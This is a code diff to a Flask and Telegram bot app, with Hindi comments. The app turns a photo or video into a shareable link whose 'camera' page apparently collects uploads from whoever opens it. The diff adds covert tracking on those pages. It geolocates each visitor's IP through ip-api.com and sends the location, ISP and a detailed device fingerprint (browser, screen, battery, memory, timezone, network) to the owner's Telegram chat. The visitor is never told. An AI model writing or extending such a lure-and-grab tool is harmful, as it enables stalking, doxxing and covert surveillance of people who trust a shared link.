@@ -16,9 +16,40 @@ OWNER_CHAT_ID = "6464233947"
 BASE_URL = os.getenv("BASE_URL", "http://localhost:5000")
 
 app = Flask(__name__)
-link_data = {}   # unique_id -> { "owner": chat_id, "media_type": "photo" या "video", "filename": file name }
+link_data = {}
 
-# ---------- स्टैटिक फ़ाइलें सर्व करें ----------
+# ---------- IP से जानकारी ----------
+def get_ip_info(ip):
+    try:
+        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=city,region,country,isp,query")
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get("status") != "fail":
+                return (f"IP: {data['query']}\n"
+                        f"City: {data.get('city', 'N/A')}\n"
+                        f"Region: {data.get('region', 'N/A')}\n"
+                        f"Country: {data.get('country', 'N/A')}\n"
+                        f"ISP: {data.get('isp', 'N/A')}")
+    except:
+        pass
+    return f"IP: {ip}\n(Could not resolve location)"
+
+# ---------- डिवाइस इन्फो मैसेज बनाना ----------
+def build_device_message(data):
+    msg = "📱 Device Info:\n"
+    msg += f"Browser/OS: {data.get('userAgent', 'N/A')}\n"
+    msg += f"Platform: {data.get('platform', 'N/A')}\n"
+    msg += f"Language: {data.get('language', 'N/A')}\n"
+    msg += f"Screen: {data.get('screenWidth')}x{data.get('screenHeight')} ({data.get('colorDepth')}bit)\n"
+    msg += f"Timezone: {data.get('timezone', 'N/A')}\n"
+    msg += f"CPU Cores: {data.get('hardwareConcurrency', 'N/A')}\n"
+    msg += f"Memory: {data.get('deviceMemory', 'N/A')} GB\n"
+    msg += f"Battery: {data.get('batteryLevel', 'N/A')}% (Charging: {data.get('batteryCharging', 'N/A')})\n"
+    msg += f"Network: {data.get('networkType', 'N/A')}\n"
+    msg += f"Touch: {data.get('hasTouch', 'N/A')}"
+    return msg
+
+# ---------- स्टैटिक फ़ाइलें ----------
 @app.route('/photos/<filename>')
 def serve_photo(filename):
     return send_from_directory('static', filename)
@@ -27,23 +58,48 @@ def serve_photo(filename):
 def serve_video(filename):
     return send_from_directory('static/videos', filename)
 
-# ---------- फ़ोटो पेज (पहले जैसा) ----------
+# ---------- फ़ोटो पेज ----------
 @app.route('/image/<unique_id>')
 def image(unique_id):
     if unique_id not in link_data:
         return "Invalid or expired link.", 404
+    # IP लोकेशन भेजें
+    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    owner_id = link_data[unique_id]["owner"]
+    ip_info = get_ip_info(visitor_ip)
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                  json={'chat_id': owner_id, 'text': f"🔍 New visitor\n{ip_info}"})
     photo_url = f"/photos/{link_data[unique_id]['filename']}"
     return render_template('camera.html', unique_id=unique_id, photo_url=photo_url)
 
-# ---------- नया वीडियो पेज ----------
+# ---------- वीडियो पेज ----------
 @app.route('/video_page/<unique_id>')
 def video_page(unique_id):
     if unique_id not in link_data:
         return "Invalid or expired link.", 404
+    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    owner_id = link_data[unique_id]["owner"]
+    ip_info = get_ip_info(visitor_ip)
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                  json={'chat_id': owner_id, 'text': f"🔍 New visitor\n{ip_info}"})
     video_url = f"/videos/{link_data[unique_id]['filename']}"
     return render_template('video.html', unique_id=unique_id, video_url=video_url)
 
-# ---------- फ़ोटो अपलोड (विज़िटर की ओर से) ----------
+# ---------- डिवाइस इन्फो रिसीव करें ----------
+@app.route('/device_info/<unique_id>', methods=['POST'])
+def device_info(unique_id):
+    if unique_id not in link_data:
+        return {"status": "error"}, 400
+    owner_id = link_data[unique_id]["owner"]
+    data = request.get_json()
+    if not data:
+        return {"status": "error"}, 400
+    msg = build_device_message(data)
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                  json={'chat_id': owner_id, 'text': msg})
+    return {"status": "ok"}, 200
+
+# ---------- फोटो अपलोड ----------
 @app.route('/upload/<unique_id>', methods=['POST'])
 def upload_photo(unique_id):
     if unique_id not in link_data:
@@ -67,7 +123,7 @@ def upload_photo(unique_id):
     os.remove(temp_file)
     return {"status": "ok"}, 200 if resp.status_code == 200 else 500
 
-# ---------- वीडियो अपलोड (विज़िटर की ओर से) ----------
+# ---------- वीडियो अपलोड ----------
 @app.route('/upload_video/<unique_id>', methods=['POST'])
 def upload_video(unique_id):
     if unique_id not in link_data:
@@ -90,14 +146,13 @@ def upload_video(unique_id):
 def health():
     return "OK", 200
 
-# ---------- टेलीग्राम बॉट हैंडलर्स ----------
+# ---------- बॉट हैंडलर्स ----------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "Send me a **photo** to get a photo capture link.\n"
-        "Send me a **video** to get a video capture link."
+        "📸 **Photo Link:** Send me a photo.\n"
+        "🎬 **Video Link:** Send me a video."
     )
 
-# फ़ोटो हैंडलर (पहले जैसा)
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.message.from_user
     if str(user.id) != OWNER_CHAT_ID:
@@ -110,22 +165,16 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         os.makedirs("static", exist_ok=True)
         filename = f"{unique_id}.jpg"
         await photo_file.download_to_drive(f"static/{filename}")
-        logging.info(f"Photo saved: static/{filename}")
-
         link_data[unique_id] = {"owner": OWNER_CHAT_ID, "media_type": "photo", "filename": filename}
 
         web_app_url = f"{BASE_URL}/image/{unique_id}"
         keyboard = [[InlineKeyboardButton("📸 Open Photo", web_app=WebAppInfo(url=web_app_url))]]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await update.message.reply_text(
-            f"🔗 Photo link:\n{web_app_url}",
-            reply_markup=reply_markup
-        )
+        await update.message.reply_text(f"🔗 {web_app_url}", reply_markup=reply_markup)
     except Exception as e:
-        logging.error(f"Failed to process photo: {e}")
-        await update.message.reply_text("❌ Something went wrong, try another photo.")
+        logging.error(f"Photo error: {e}")
+        await update.message.reply_text("❌ Something went wrong.")
 
-# नया वीडियो हैंडलर
 async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.message.from_user
     if str(user.id) != OWNER_CHAT_ID:
@@ -136,30 +185,24 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
         video_file = await update.message.video.get_file()
         unique_id = uuid.uuid4().hex[:10]
         os.makedirs("static/videos", exist_ok=True)
-        # टेलीग्राम से डाउनलोड होने वाली वीडियो का एक्सटेंशन .mp4 हो सकता है
         ext = os.path.splitext(video_file.file_path)[1] or ".mp4"
         filename = f"{unique_id}{ext}"
         await video_file.download_to_drive(f"static/videos/{filename}")
-        logging.info(f"Video saved: static/videos/{filename}")
-
         link_data[unique_id] = {"owner": OWNER_CHAT_ID, "media_type": "video", "filename": filename}
 
         web_app_url = f"{BASE_URL}/video_page/{unique_id}"
         keyboard = [[InlineKeyboardButton("🎬 Open Video", web_app=WebAppInfo(url=web_app_url))]]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await update.message.reply_text(
-            f"🎥 Video link:\n{web_app_url}",
-            reply_markup=reply_markup
-        )
+        await update.message.reply_text(f"🎥 {web_app_url}", reply_markup=reply_markup)
     except Exception as e:
-        logging.error(f"Failed to process video: {e}")
-        await update.message.reply_text("❌ Something went wrong, try another video.")
+        logging.error(f"Video error: {e}")
+        await update.message.reply_text("❌ Something went wrong.")
 
 def run_bot():
     app_bot = Application.builder().token(BOT_TOKEN).build()
     app_bot.add_handler(CommandHandler("start", start))
     app_bot.add_handler(MessageHandler(filters.PHOTO, handle_photo))
-    app_bot.add_handler(MessageHandler(filters.VIDEO, handle_video))   # नया
+    app_bot.add_handler(MessageHandler(filters.VIDEO, handle_video))
     print("🤖 Bot polling started...")
     app_bot.run_polling()
 
